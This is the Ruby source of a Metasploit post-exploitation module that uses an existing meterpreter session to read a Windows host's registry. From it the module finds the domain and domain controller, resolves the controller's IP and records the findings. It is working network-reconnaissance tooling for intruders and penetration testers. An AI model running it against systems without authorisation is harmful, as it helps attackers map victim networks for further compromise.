##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Post
  include Msf::Post::Windows::Priv

  def initialize(info={})
    super(update_info(info,
      'Name'            => "Windows Gather Enumerate Domain",
      'Description'     => %q{
        This module identifies the primary domain via the registry. The registry value used is:
        HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History\\DCName.
        },
      'License'         => MSF_LICENSE,
      'Platform'        => ['win'],
      'SessionTypes'    => ['meterpreter'],
      'Author'          => ['Joshua Abraham <jabra[at]rapid7.com>']
    ))
  end

  def reg_getvaldata(key,valname)
    value = nil
    begin
      root_key, base_key = client.sys.registry.splitkey(key)
      open_key = client.sys.registry.open_key(root_key, base_key, KEY_READ)
      v = open_key.query_value(valname)
      value = v.data
      open_key.close
    rescue
    end
    return value
  end

  def get_domain()
    domain = nil
    begin
      subkey = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History"
      v_name = "DCName"
      domain = reg_getvaldata(subkey, v_name)
    rescue
      print_error("This host is not part of a domain.")
    end
    return domain
  end

  def gethost(hostorip)
    #check for valid ip and return if it is
    return hostorip if Rex::Socket.dotted_ip?(hostorip)

    ## get IP for host
    vprint_status("Looking up IP for #{hostorip}")
    result = client.net.resolve.resolve_host(hostorip)
    return result[:ip] if result[:ip]
    return nil if result[:ip].nil? or result[:ip].empty?
  end

  def run
    domain = get_domain()
    if not domain.nil? and domain =~ /\./
      dom_info =  domain.split('.')
      dom_info[0].sub!(/\\\\/,'')
      report_note(
        :host   => session,
        :type   => 'windows.domain',
        :data   => { :domain => dom_info[1] },
        :update => :unique_data
      )
      print_good("FOUND Domain: #{dom_info[1]}")
      dc_ip = gethost(dom_info[0])
      if not dc_ip.nil?
        print_good("FOUND Domain Controller: #{dom_info[0]} (IP: #{dc_ip})")
        report_host({
            :host => dc_ip,
            :name => dom_info[0],
            :info => "Domain controller for #{dom_info[1]}"
          })
      else
        print_good("FOUND Domain Controller: #{dom_info[0]}")
      end
    end
  end
end
